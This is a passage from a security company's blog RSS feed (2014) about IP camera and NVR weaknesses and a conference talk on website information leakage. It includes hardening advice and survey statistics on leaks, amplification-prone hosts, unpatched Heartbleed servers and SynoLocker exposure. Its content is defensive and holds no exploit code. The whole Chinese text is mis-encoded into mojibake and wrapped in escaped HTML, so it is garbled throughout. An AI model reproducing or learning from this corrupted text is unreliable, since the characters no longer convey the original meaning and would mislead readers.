ç«¯å†æ¬¡é€²è¡Œé©—è­‰è¼¸å…¥è³‡æ–™æ˜¯å¦ç•°å¸¸ï¼Œå°±æœ‰å¾ˆé«˜çš„æ©Ÿæœƒè¢«å…¥ä¾µæˆåŠŸã€‚&lt;/p&gt;

&lt;p&gt;å¦ä¸€æ–¹é¢å‰‡æ˜¯å…¥ä¾µè€…çš„æ”»æ“Šæ‰‹æ³•åƒè®Šè¬åŒ–ï¼Œé›£ä»¥ä¿è­‰ä¸æœƒæœ‰æ–°çš„ 0-Day å¼±é»å‡ºç¾ã€‚ä¾‹å¦‚ä»Šå¹´ä¸€æœˆä»½å¤§é‡çˆ†ç™¼çš„ NTP å¼±é» CVE-2013-5211 å°±å­˜åœ¨æ–¼ä¸Šè¿°å…­å€‹æ¡ˆä¾‹å…¶ä¸­ä¹‹ä¸€ï¼Œæˆ‘æƒ³å» å•†æ‡‰è©²ä¸æœƒæœ‰æ„é¡˜é‡å°èˆŠç”¢å“ä¿®å¾©æ­¤é¡æ¼æ´ï¼Œä¹Ÿå°±æ˜¯æœªä¾†éš¨æ™‚æœ‰å¹¾ç™¾å°çš„æ”å½±æ©Ÿå¯è¢«æƒ¡æ„äººå£«ç”¨ä¾†åŸ·è¡Œ DDoS æ”»æ“Šã€‚å¦å¤–ä»Šå¹´å››æœˆä»½çš„ OpenSSL Heartbleed å¼±é»æ›´æ˜¯ä¸€å€‹å…·æœ‰ä»£è¡¨æ€§çš„é‡è¦æ¡ˆä¾‹ï¼Œæˆ‘æƒ³é€™æ‡‰è©²æ˜¯è¨±å¤šå®‰æ§è¨­å‚™å» å•†éƒ½æœƒä½¿ç”¨çš„ç¨‹å¼ã€‚ç•¶å» å•†å°‡æ­¤é¡ç¨‹å¼ç´å…¥ç¶²è·¯å®‰æ§è¨­å‚™ä¸­ï¼Œæ–¼å¼±é»è¢«æ­éœ²æ™‚è‹¥ç„¡æ³•åŠæ™‚æœ‰æ•ˆä¿®è£œï¼Œæˆ–æ˜¯ä¿®è£œçš„æˆæœ¬å¤ªé«˜å°è‡´ç”¨æˆ¶ä¸é¡˜æ„ä¿®è£œã€æ²’æœ‰èƒ½åŠ›ä¿®è£œï¼Œå°±æœ‰å¯èƒ½é‡€æˆé‡å¤§ç½æƒ…ï¼Œä¸ä½†é€ æˆç”¨æˆ¶æå¤±ï¼Œä¹Ÿåš´é‡å½±éŸ¿å•†è­½ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å» å•†è©²å¦‚ä½•å› æ‡‰&quot;&gt;å» å•†è©²å¦‚ä½•å› æ‡‰ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;é‡å°æ­¤é¡è³‡å®‰å•é¡Œï¼Œå¤§å‹ç¡¬é«”å» å•†æ‡‰è©²è½å¯¦ä»¥ä¸‹å¹¾å€‹å‹•ä½œï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ”¹å–„è³‡å®‰å•é¡Œæ›´æ–°æµç¨‹ï¼šå°‡ç”¢å“çš„è³‡å®‰æ›´æ–°æ”¹è®Šæˆä¸»å‹•é€šçŸ¥ä½¿ç”¨è€…ï¼Œè€Œééœ€è¦ä½¿ç”¨è€…ä¸»å‹•åˆ°å®˜ç¶²çœ‹æ‰çŸ¥é“æ›´æ–°ï¼Œä»¥ç¸®çŸ­ä½¿ç”¨è€…æ›´æ–°çš„å¹³å‡é€±æœŸï¼Œç¢ºä¿ä½¿ç”¨è€…çš„è»Ÿé«”æ˜¯æœ€æ–°ç„¡é¢¨éšªç‰ˆæœ¬ã€‚&lt;/li&gt;
  &lt;li&gt;æˆç«‹å°ˆé–€è³‡å®‰å°çµ„ï¼šè«‹å°ˆäººè² è²¬æª¢é©—ç”¢å“çš„è³‡å®‰å“è³ªèˆ‡ä¿®æ­£è³‡å®‰å¼±é»ï¼Œä»¥ä¾¿å› æ‡‰è‡¨æ™‚çˆ†ç™¼çš„é‡å¤§å¼±é»ï¼Œç¶­æŒç”¢å“çš„è³‡å®‰å“è³ªã€‚&lt;/li&gt;
  &lt;li&gt;é»‘ç®±æ»²é€æ¸¬è©¦ï¼šæ–¼ç”¢å“å‡ºå» å‰åŸ·è¡Œé»‘ç®±æ»²é€æ¸¬è©¦ï¼Œè®“æ»²é€æ¸¬è©¦å°ˆå®¶å¾é»‘å¸½é§­å®¢çš„è§’åº¦ä¾†æª¢æŸ¥ç”¢å“æœ‰ç„¡æ¼æ´ã€‚&lt;/li&gt;
  &lt;li&gt;ç™½ç®±åŸå§‹ç¢¼æª¢æ¸¬ï¼šå®šæœŸåŸ·è¡ŒåŸå§‹ç¢¼æª¢æ¸¬ï¼Œå¾ç”¢å“çš„æ ¹æœ¬è™•è‘—æ‰‹æ”¹å–„ï¼Œé™ä½ç”¢å“ä¸Šå¸‚å¾Œæ‰è¢«ç™¼ç¾å¼±é»çš„æ©Ÿç‡ã€‚&lt;/li&gt;
  &lt;li&gt;è³‡å®‰æ•™è‚²è¨“ç·´ï¼šè«‹æœ‰å¯¦éš›æ”»é˜²ç¶“é©—çš„è³‡å®‰å°ˆå®¶çµ¦äºˆé–‹ç™¼äººå“¡æ­£ç¢ºçš„è³‡å®‰è§€å¿µï¼Œäº†è§£æœ€æ–°çš„æ”»æ“Šæ‰‹æ³•èˆ‡æœ‰æ•ˆé˜²ç¦¦ä¹‹é“ã€‚&lt;/li&gt;
  &lt;li&gt;å®šæœŸæª¢é–±ç”¢å“æ‰€ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹è»Ÿé«”å¥—ä»¶æ˜¯å¦æœ‰å¼±é»ï¼Œä¾‹å¦‚ OpenSSLï¼Œä»¥é¿å…æŠŠæœ‰å•é¡Œçš„ç‰ˆæœ¬ç´å…¥ç”¢å“ï¼Œé€ æˆç”¢å“é–“æ¥ç”¢ç”Ÿå¼±é»ï¼Œå› è€Œé­åˆ°å…¥ä¾µã€‚&lt;/li&gt;
  &lt;li&gt;å®šæ™‚æ–¼ç¶²è·¯ä¸Šæ”¶é›†ç”¢å“çš„ç›¸é—œå¼±é»è³‡æ–™ï¼Œä¾‹å¦‚ &lt;a href=&quot;http://secunia.com/&quot;&gt;Secunia&lt;/a&gt;ã€&lt;a href=&quot;http://www.securityfocus.com/&quot;&gt;SecurityFocus&lt;/a&gt;ã€&lt;a href=&quot;http://packetstormsecurity.com/&quot;&gt;Packet Storm&lt;/a&gt; ç­‰ç¶²ç«™éƒ½æ˜¯å¾ˆå¥½çš„è³‡è¨Šä¾†æºã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ä¸€èˆ¬ä½¿ç”¨è€…ä¼æ¥­è©²å¦‚ä½•äº¡ç¾Šè£œç‰¢&quot;&gt;ä¸€èˆ¬ä½¿ç”¨è€…ã€ä¼æ¥­è©²å¦‚ä½•äº¡ç¾Šè£œç‰¢ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;ç›®å‰çš„ç¶²è·¯å®‰æ§ç³»çµ±ä½¿ç”¨è€…ä»æœªæœ‰è¶³å¤ çš„è³‡å®‰æ„è­˜ï¼Œä¸»è¦ç¾è±¡æœ‰ä»¥ä¸‹å¹¾é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä½¿ç”¨å¼±å¯†ç¢¼&lt;/li&gt;
  &lt;li&gt;æœªé€²è¡Œé©ç•¶çš„æ¬Šé™åŠƒåˆ†èˆ‡ç®¡ç†&lt;/li&gt;
  &lt;li&gt;å®¹æ˜“é–‹å•“æ”»æ“Šè€…å¯„é€çš„æƒ¡æ„é€£çµï¼Œå°è‡´è¢« XSSã€CSRF ç­‰æ‰‹æ³•æ”»æ“Š&lt;/li&gt;
  &lt;li&gt;æœªé™åˆ¶é€£å…¥ IP ä½å€ï¼Œå°è‡´å®‰æ§ç³»çµ±å¯å¾å¤–ç¶²ä»»æ„å­˜å–&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç„¶è€Œï¼Œç„¡è«–æ˜¯å®‰æ§ç³»çµ±æˆ–å…¶ä»–ä»»ä½•é€£ç¶²è¨­å‚™ï¼Œæœªä¾†éƒ½æœ‰å¯èƒ½æˆç‚ºæ½›åœ¨çš„æ”»æ“Šç›®æ¨™ï¼Œè€Œä¸”åœ¨å» å•†æä¾›æ›´æ–°æª”ä¹‹å‰å…¶å¯¦ä¹Ÿå¾ˆé›£ç¢ºå¯¦åœ°è‡ªä¿ï¼Œå› æ­¤äº†è§£è³‡å®‰çŸ¥è­˜èˆ‡å¸¸è¦‹çš„æ”»æ“Šæ‰‹æ³•æ˜¯æœ‰å…¶å¿…è¦çš„ã€‚åŸºæœ¬çš„é˜²ç¯„ä¹‹é“å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä½¿ç”¨å¼·å¯†ç¢¼ï¼ŒåŒ…å«å¤§å°å¯«è‹±æ–‡ã€æ•¸å­—ã€ç‰¹æ®Šç¬¦è™Ÿï¼Œä¸¦ä¸”å®šæœŸæ›´æ›å¯†ç¢¼&lt;/li&gt;
  &lt;li&gt;å‹¿åœ¨ç³»çµ±å»ºç«‹å¤ªå¤šä¸å¿…è¦çš„ä½¿ç”¨è€…å¸³è™Ÿã€å°‡å¤šé¤˜çš„å¸³è™Ÿç§»é™¤ï¼Œä»¥é™ä½å¸³è™Ÿè¢«ç›œçš„æ©Ÿç‡ã€‚è‹¥éœ€è¦å»ºç«‹å¤šçµ„å¸³è™Ÿï¼Œè«‹ä»”ç´°çµ¦äºˆé©ç•¶çš„æ¬Šé™&lt;/li&gt;
  &lt;li&gt;å‹¿éš¨æ„é–‹å•Ÿå¯ç–‘ä¿¡ä»¶é™„å¸¶çš„é€£çµæˆ–æª”æ¡ˆï¼Œä»¥é¿å…è¢«æ”»æ“Šè€…ä»¥ XSSã€CSRF ç­‰æ‰‹æ³•æ”»æ“Š&lt;/li&gt;
  &lt;li&gt;é™åˆ¶å¯å­˜å–è³‡è¨Šç³»çµ±çš„ IP ä½å€ï¼Œé¿å…è³‡è¨Šç³»çµ±æˆç‚ºå…¬é–‹çš„æ”»æ“Šç›®æ¨™&lt;/li&gt;
  &lt;li&gt;å®šæœŸæª¢æŸ¥ logï¼Œç¢ºèªæœ‰ç„¡ç•°å¸¸ç™»å…¥ã€ç•°å¸¸æ“ä½œç”šè‡³æ˜¯ç•°å¸¸å¸³è™Ÿç­‰è³‡è¨Š&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;åœ¨ç‰©é€£ç¶²çš„æ™‚ä»£ä¸­ï¼Œå„ç¨®å¯é€²è¡Œç„¡ç·šé€šè¨Šçš„è¨­å‚™è¢«æ”»æ“Šçš„äº‹ä»¶å±¢è¦‹ä¸é®®ï¼Œä¾‹å¦‚ 2011 å¹´çŸ¥åé§­å®¢ Jay Radcliffe åœ¨ Black Hat å±•ç¤ºå¦‚ä½•æ”»æ“Šèƒ°å³¶ç´ æ³¨å°„å™¨ï¼Œ2013 å¹´å·²æ•…é§­å®¢ Barnaby Jack åŸæœ¬è¦åœ¨ Black Hat å±•ç¤ºå¦‚ä½•åˆ©ç”¨è—èŠ½é€šè¨Šæ§åˆ¶å¿ƒå¾‹èª¿æ•´å™¨ï¼Œç”šè‡³ 2014 å¹´ç”«æ¨å‡ºçš„å¯é ç¨‹è®Šæ›é¡è‰²ç‡ˆæ³¡ä¹Ÿè¢«æ­éœ²æœ‰è³‡å®‰å•é¡Œã€‚åœ¨ä¸ä¹…çš„æœªä¾†ï¼Œé€™äº›è³‡å®‰å•é¡Œåªæœƒæ›´å¤šï¼Œèº«ç‚ºæ°‘çœ¾ã€ä¼æ¥­ã€å» å•†çš„ä½ ï¼Œæº–å‚™å¥½é¢å°è¬ç‰©çš†å¯é§­çš„ç‰©é€£ç¶²æ™‚ä»£äº†å—ï¼Ÿ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/</link>
                <guid>https://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr</guid>
                <pubDate>Wed, 24 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>è¢«éºå¿˜çš„è³‡è¨Šæ´©æ¼ï¼é‡é»å›é¡§</title>
                <description>&lt;h3 id=&quot;å‰è¨€&quot;&gt;å‰è¨€&lt;/h3&gt;

&lt;p&gt;åœ¨ä»Šå¹´é§­å®¢å¹´æœƒä¼æ¥­å ´ï¼Œæˆ‘å€‘åˆ†äº«äº†ä¸€å ´ã€è¢«éºå¿˜çš„è³‡è¨Šæ´©æ¼ã€ã€‚è³‡è¨Šæ´©æ¼æ˜¯åå¹¾å¹´å‰å°±è¢«ä¸€æå†æçš„è­°é¡Œï¼Œåœ¨è³‡è¨Šå®‰å…¨é ˜åŸŸä¸­ä¹Ÿæ˜¯æœ€æœ€æœ€åŸºæœ¬è©²æ³¨æ„çš„äº‹æƒ…ï¼Œç„¶è€Œè‡³ä»Šå¾ˆå¤šç¶²ç«™éƒ½é‚„æ˜¯å¿½ç•¥å®ƒï¼Œç”šè‡³é€£ä¸€äº›ç†±é–€ç¶²ç«™éƒ½ä»æœ‰è³‡è¨Šæ´©æ¼å•é¡Œã€‚è­°ç¨‹ä¸­æˆ‘å€‘èˆ‰äº†å¤§é‡çš„ä¾‹å­è­‰æ˜è³‡è¨Šæ´©æ¼å…¶å¯¦å¯ä»¥å¾ˆåš´é‡ï¼Œå¸Œæœ›èƒ½å¹«å¤§å®¶è¤‡ç¿’ä¸€ä¸‹ï¼Œå¦‚æœç¶²ç«™æ²’æœ‰æ³¨æ„é€™äº›ï¼Œæœƒé€ æˆä»€éº¼æ¨£çš„å¾Œæœã€‚è­°ç¨‹æŠ•å½±ç‰‡å¦‚ä¸‹æ‰€ç¤ºï¼Œå°±è®“æˆ‘å€‘ä¾†ç¸½çµä¸€ä¸‹å§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;center&gt;&lt;iframe src=&quot;http://www.slideshare.net/slideshow/embed_code/38312258&quot; width=&quot;560&quot; height=&quot;460&quot; frameborder=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; scrolling=&quot;no&quot; style=&quot;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&quot;&gt; &lt;/iframe&gt;&lt;/center&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;devcore-å¸¸åˆ©ç”¨çš„è³‡è¨Šæ´©æ¼&quot;&gt;DEVCORE å¸¸åˆ©ç”¨çš„è³‡è¨Šæ´©æ¼&lt;/h3&gt;

&lt;p&gt;é¦–å…ˆæˆ‘å€‘å¾éå¾€æ»²é€æ¸¬è©¦ç¶“é©—ä¸­æŒ‘é¸äº†å¹¾å€‹å¸¸è¦‹çš„è³‡è¨Šæ´©æ¼å•é¡Œï¼Œåˆ†åˆ¥å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç®¡ç†ä»‹é¢æ´©æ¼ (p8-p19)&lt;/li&gt;
  &lt;li&gt;ç›®éŒ„(Index of)æ´©æ¼ (p20-p28)&lt;/li&gt;
  &lt;li&gt;éŒ¯èª¤è¨Šæ¯æ´©æ¼ (p29-p35)&lt;/li&gt;
  &lt;li&gt;æš«å­˜ã€æ¸¬è©¦è³‡è¨Š (p36-p46)&lt;/li&gt;
  &lt;li&gt;ç‰ˆæœ¬æ§ç®¡ (p47-p55)&lt;/li&gt;
  &lt;li&gt;DNS è³‡è¨Šæ´©æ¼ (p56-p63)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ä»¥ä¸Šç¨®ç¨®ä¸åŒæ´©æ¼æ–¹å¼ï¼Œå¯èƒ½æœƒæ´©æ¼å‡ºç³»çµ±ç’°å¢ƒè³‡è¨Šã€ç¨‹å¼ç¢¼å…§å®¹ã€å«æœ‰å¸³è™Ÿå¯†ç¢¼çš„è¨­å®šæª”ç­‰ã€‚é€éé€™äº›è³‡è¨Šï¼Œé§­å®¢å°±èƒ½çµ„ç¹”å‡ºä¸€å€‹æœ‰æ•ˆçš„æ”»æ“Šè¡Œå‹•ã€‚æˆ‘å€‘ç”šè‡³åœ¨éå¾€çš„ç¶“é©—ä¸­ï¼Œåªé€éç›®æ¨™çš„è³‡è¨Šæ´©æ¼ï¼Œå°±ç›´æ¥å–å¾—è³‡æ–™åº«æ“ä½œæ¬Šé™(è©³è¦‹æŠ•å½±ç‰‡ p65-p71)ã€‚&lt;/p&gt;

&lt;p&gt;ç‚ºäº†è§£ç›®å‰ä¸€äº›ç†±é–€ç¶²ç«™æ˜¯å¦é‡è¦–é€™äº›æœ€åŸºæœ¬çš„ä¿è­·ï¼Œæˆ‘å€‘å¯¦éš›å° alexa å°ç£å‰ 525 åçš„ç¶²ç«™é€²è¡Œè³‡è¨Šæ´©æ¼çš„èª¿æŸ¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/phpmyadmin_leak.jpg&quot; alt=&quot;phpmyadmin é é¢æ´©æ¼ç‹€æ³&quot; /&gt;
&lt;img src=&quot;/assets/img/blog/20140826/phpinfo_leak.jpg&quot; alt=&quot;phpinfo é é¢æ´©æ¼ç‹€æ³&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ç®¡ç†ä»‹é¢å’Œæ¸¬è©¦é é¢æ´©æ¼çš„é …ç›®ï¼Œæˆ‘å€‘ç”¨å¾ˆä¿å®ˆçš„æ–¹å¼æ¸¬è©¦æ ¹ç›®éŒ„ä¸‹æ˜¯å¦å­˜æœ‰ phpmyadmin å’Œ phpinfo é é¢ï¼Œçµæœåˆ†åˆ¥æœ‰ 7% å’Œ 9% çš„ç¶²ç«™æœ‰é€™æ¨£çš„å•é¡Œã€‚é€™æ¨£çš„çµæœéå¸¸ä»¤äººè¨ç•°ï¼Œç•¢ç«Ÿå—æ¸¬ç¶²ç«™éƒ½æ˜¯çŸ¥åä¸”æœ‰æŠ€è¡“åŠ›çš„ç¶²ç«™ï¼Œè€Œä¸”ä¸¦éæ‰€æœ‰ç¶²ç«™éƒ½ä½¿ç”¨ php é–‹ç™¼ï¼Œå†åŠ ä¸Šæˆ‘å€‘åªæ˜¯æ¸¬è©¦é è¨­çš„å‘½åï¼Œå¯¦éš›æ´©æ¼çš„æƒ…æ³æœƒæ›´å¤šï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/version_control_leak.jpg&quot; alt=&quot;ç‰ˆæœ¬æ§åˆ¶æ´©æ¼ç‹€æ³&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦ä¸€å€‹å€¼å¾—ä¸€æçš„æ˜¯ç‰ˆæœ¬æ§ç®¡æ´©æ¼å•é¡Œï¼Œæˆ‘å€‘åŒæ¨£ä¿å®ˆçš„åªé‡å°ç‰ˆæœ¬æ§ç®¡è»Ÿé«”ä¸­ GIT å’Œ SVN å…©é …é€²è¡Œèª¿æŸ¥ã€‚çµæœç«Ÿç„¶æœ‰ 10% çš„ç¶²ç«™æœ‰é€™æ¨£çš„å•é¡Œã€‚é€™å€‹ç¾è±¡éå¸¸åš´é‡ï¼é€™å€‹ç¾è±¡éå¸¸åš´é‡ï¼é€™å€‹ç¾è±¡éå¸¸åš´é‡ï¼é€™å€‹æ´©æ¼æœ‰æ©Ÿæœƒèƒ½é‚„åŸæ•´å€‹æœå‹™çš„åŸå§‹ç¢¼ï¼Œè¢«æ”»æ“ŠæˆåŠŸçš„æ©Ÿç‡ç›¸ç•¶é«˜ï¼å°ç£ç†±é–€çš„ç¶²ç«™è£¡ï¼Œåå€‹è£¡é¢å°±æœ‰ä¸€å€‹å­˜æœ‰é€™æ¨£çš„å•é¡Œï¼Œéå¸¸å±éšªï¼Œç…©è«‹çœ‹åˆ°é€™ç¯‡æ–‡ç« çš„æœ‹å‹èƒ½å»æ³¨æ„è²´å…¬å¸çš„ç¶²ç«™æ˜¯å¦å­˜åœ¨é€™æ¨£çš„å•é¡Œã€‚&lt;/p&gt;

&lt;h3 id=&quot;å¤§æ•¸æ“šè³‡æ–™è’é›†&quot;&gt;å¤§æ•¸æ“šè³‡æ–™è’é›†&lt;/h3&gt;

&lt;p&gt;åœ¨é€™å ´è­°ç¨‹ä¸­ï¼Œæˆ‘å€‘é‚„æåˆ°äº†å¦ä¸€å€‹å±¤æ¬¡çš„è³‡è¨Šæ´©æ¼è­°é¡Œï¼šç•¶å…¨ä¸–ç•Œä¸»æ©Ÿçš„æœå‹™åŠç‰ˆæœ¬è³‡è¨Šå…¨éƒ¨éƒ½è¢«æ”¶é›†èµ·ä¾†ï¼Œæœƒç™¼ç”Ÿä»€éº¼æ¨£çš„äº‹æƒ…ï¼Ÿ&lt;/p&gt;

&lt;p&gt;é§­å®¢æ“æœ‰é€™æ¨£çš„è³‡æ–™ï¼Œå°±èƒ½å¤ åœ¨éå¸¸çŸ­æš«çš„æ™‚é–“å…§ç¯©é¸å‡ºæœ‰å•é¡Œçš„ä¸»æ©Ÿï¼Œé€²è¡Œå¤§é‡çš„å…¥ä¾µã€‚æˆ‘å€‘åˆ©ç”¨é¡ä¼¼çš„æŠ€è¡“é‡å°å°ç£ä¸»æ©Ÿå¿«é€Ÿçš„é€²è¡Œæƒæï¼Œå°±ç™¼ç¾äº†å°ç£æœ‰ 61414 å°ä¸»æ©Ÿå¯ä»¥è¢«åˆ©ç”¨ä¾†åš DNS Amplification DDoS æ”»æ“Šã€1003 å°ä¸»æ©Ÿå¯ä»¥è¢«åˆ©ç”¨ä¾†åš NTP Amplification DDoS æ”»æ“Šã€‚ä¹Ÿå°±æ˜¯èªªï¼Œé§­å®¢å¯ä»¥åœ¨çŸ­æ™‚é–“å…§çµ„ç¹”ä¸€æ”¯å…­è¬å¤šäººçš„å°ç£å¤§è»ï¼Œå¯ä»¥é‡å°ä»–æƒ³è¦æ”»æ“Šçš„ç›®æ¨™é€²è¡Œæ”»æ“Šã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/heartbleed.jpg&quot; alt=&quot;OpenSSL Heartbleed å°šæœªä¿®å¾©çš„ç‹€æ³&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ©ç”¨ç›¸åŒçš„æŠ€è¡“ï¼Œæˆ‘å€‘ä¹Ÿé †ä¾¿æª¢é©—äº†å‰é™£å­éå¸¸ç†±é–€çš„ &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;OpenSSL Heartbleed&lt;/a&gt; å•é¡Œã€‚OpenSSL Heartbleed è¢«ç¨±ä¹‹ç‚ºã€è¿‘åå¹´ç¶²è·¯æœ€åš´é‡çš„å®‰å…¨æ¼æ´ã€ï¼Œå…¶åš´é‡ç¨‹åº¦å¯ä»¥æƒ³è¦‹ï¼Œç„¶è€Œæ ¹æ“šæˆ‘å€‘çš„è§€å¯Ÿï¼Œå°ç£è‡³ä»Šä»æœ‰ 1480 å° HTTP ä¼ºæœå™¨å°šæœªä¿®å¾©ï¼Œè€Œå°ç£å‰ 525 å¤§ç†±é–€ç¶²ç«™ä¸­ï¼Œä¹Ÿæœ‰ 21 å€‹(4%)ç¶²ç«™æœªä¿®å¾©ã€‚è¶³è¦‹å°ç£ç¶²ç«™å°æ–¼è³‡å®‰çš„æ„è­˜ä»ç„¶ä¸å¤ ã€‚&lt;/p&gt;

&lt;p&gt;å°æ–¼é€™æ¨£æµ·é‡æ”¶é›†è³‡æ–™è¡ç”Ÿçš„è³‡å®‰è­°é¡Œï¼Œæˆ‘å€‘èªç‚ºæœ€å¤§çš„å—å®³è€…ï¼Œæ˜¯ç‰©è¯ç¶²çš„ä½¿ç”¨è€…ï¼å°±æˆ‘å€‘çš„è§€å¯Ÿï¼Œç‰©è¯ç¶²çš„è¨­å‚™é€šå¸¸å®‰å…¨é˜²è­·ä¸ä½³ï¼Œå®¹æ˜“é­å—åˆ°é§­å®¢æ”»æ“Šï¼Œå‰é™£å­ &lt;a href=&quot;http://www8.hp.com/us/en/hp-news/press-release.html?id=1744676&quot;&gt;HP ä¹Ÿå‡ºäº†ä¸€ä»½å ±å‘ŠæŒ‡å‡º&lt;/a&gt;ï¼Œç‰©è¯ç¶²çš„è¨­å‚™æœ‰ä¸ƒæˆå­˜åœ¨å¼±é»ï¼Œè€Œä¸”æ¯å°è¨­å‚™å¹³å‡æœ‰ 25 å€‹å¼±é»ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç‰©è¯ç¶²çš„è¨­å‚™ä¸æ˜“æ›´æ–°ï¼Œå°‘æœ‰äººæœƒå®šæœŸæ›´æ–°ï¼Œæ›´å°è‡´ç‰©è¯ç¶²è¨­å‚™å¯ä»¥è¢«å¤§ç¯„åœçš„æ”»æ“Šï¼Œé€²è€Œæ»²é€å®¶ç”¨ç¶²è·¯ï¼Œå±å®³ä½¿ç”¨è€…å±…å®¶éš±ç§ã€‚é€™æ˜¯å€‹æœªä¾†éœ€è¦æŒçºŒé—œæ³¨çš„é‡è¦è­°é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20140826/synolocker.jpg&quot; alt=&quot;ä»æš´éœ²åœ¨ SynoLocker é¢¨éšªç‹€æ³çµ±è¨ˆ&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æœ€å¾Œï¼Œæˆ‘å€‘ç”¨æœ€è¿‘ SynoLocker çš„æ¡ˆä¾‹ç‚ºå¤§æ•¸æ“šè³‡æ–™è’é›†ä½œçµï¼ŒSynoLocker æ˜¯ä¸€æ¬¾é‡å° Synology çš„å‹’ç´¢è»Ÿé«”ï¼Œå»å¹´åº• Synology å®˜æ–¹å·²ç¶“æ¨å‡ºæ–°ç‰ˆä¿®æ­£å•é¡Œï¼Œæœ¬æœˆ SynoLocker æ“´æ•£è‡³å…¨ä¸–ç•Œï¼Œæ–°èä¸€å†å¼·èª¿éœ€è¦æ›´æ–° NASï¼Œä½†æˆ‘å€‘é‡å°å°ç£ 1812 å°å°å¤–é–‹æ”¾çš„ Synology NAS åšçµ±è¨ˆï¼Œè‡³ä»Šä»ç™¼ç¾æœ‰ 64ï¼… çš„ä½¿ç”¨è€…æ²’æœ‰æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯é€™äº› NAS ä»æš´éœ²åœ¨ SynoLocker çš„é¢¨éšªä¸­ã€‚é€™ä»¶äº‹æƒ…åˆå†æ¬¡è­‰æ˜é§­å®¢æœ‰èƒ½åŠ›åœ¨çŸ­æ™‚é–“åˆ©ç”¨å¤§æ•¸æ“šè³‡æ–™æ‰¾åˆ°æ”»æ“Šç›®æ¨™ï¼Œä¹Ÿé †å¸¶èªªæ˜äº†å°ç£è³‡å®‰æ„è­˜æ™®éä¸è¶³çš„å•é¡Œã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–&quot;&gt;çµè«–&lt;/h3&gt;

&lt;p&gt;åœ¨é€™æ¬¡è­°é¡Œæˆ‘å€‘é—œæ³¨äº†å¾ˆå¤è€çš„è³‡è¨Šæ´©æ¼å•é¡Œï¼Œä¸¦ä¸”ç™¼ç¾ç›®å‰å°ç£ä¸€äº›ç†±é–€ç¶²ç«™ä»ç„¶å­˜åœ¨é€™æ¨£çš„å•é¡Œã€‚è³‡è¨Šæ´©æ¼ä¹Ÿè¨±ä¸æ˜¯ä¸€ä»¶å¾ˆåš´é‡çš„äº‹æƒ…ï¼Œä½†å¾€å¾€èƒ½æ¿€èµ·é§­å®¢é«˜æ¼²çš„æƒ…ç·’ï¼Œé§­å®¢æœƒèªç‚ºä¸€å€‹ç¶²ç«™é€£æœ€æœ€æœ€åŸºæœ¬çš„è³‡æ–™ä¿è­·éƒ½æ²’æœ‰åšåˆ°ï¼Œä¸€å®šæœƒå­˜åœ¨å…¶ä»–è³‡å®‰å•é¡Œï¼Œé€²è€Œé€²è¡Œæ›´å¤§é‡çš„æ”»æ“Šè¡Œç‚ºã€‚è€Œäº‹å¯¦ä¸Šï¼Œæˆ‘å€‘ä¹Ÿå¾å¯¦ä¾‹è­‰æ˜äº†å…¶å¯¦è³‡è¨Šæ´©æ¼å¯ä»¥å¾ˆåš´é‡ï¼Œå¸Œæœ›ç¶²ç«™æä¾›è€…èƒ½å¤ æ³¨é‡é€™å€‹ç°¡å–®å¯è§£æ±ºä¸”é‡è¦çš„è­°é¡Œã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘ä¹Ÿæåˆ°äº†é§­å®¢é€éå¹³å¸¸å¤§é‡çš„è³‡æ–™æ”¶é›†ï¼Œåœ¨éœ€è¦çš„æ™‚å€™èƒ½å¿«é€Ÿæ‰¾åˆ°ç›®æ¨™ä¸¦ä¸”å¤§ç¯„åœæ”»æ“Šã€‚é€™å…¶ä¸­åˆä»¥ç‰©è¯ç¶²çš„ç”¨æˆ¶å½±éŸ¿æœ€å¤šã€‚é¢å°é€™æ¨£çš„è­°é¡Œï¼Œæˆ‘å€‘å»ºè­°é™¤äº†é©ç•¶çš„éš±è—(å½é€ )ä¸»æ©Ÿç‰ˆæœ¬è³‡è¨Šä»¥é¿å…å‡ºç¾ 0-Day æ™‚æˆç‚ºé¦–è¦æ”»æ“Šç›®æ¨™ã€‚æˆ‘å€‘ä¹Ÿæå€¡è¦å°è‡ªå·±çš„æœå‹™åšæ™®æŸ¥ï¼Œäº†è§£è‡ªå·±åˆ°åº•å°å¤–é–‹å•Ÿäº†ä»€éº¼æœå‹™ï¼Œä»¥åŠé—œæ³¨è‡ªå·±ä½¿ç”¨çš„&lt;a 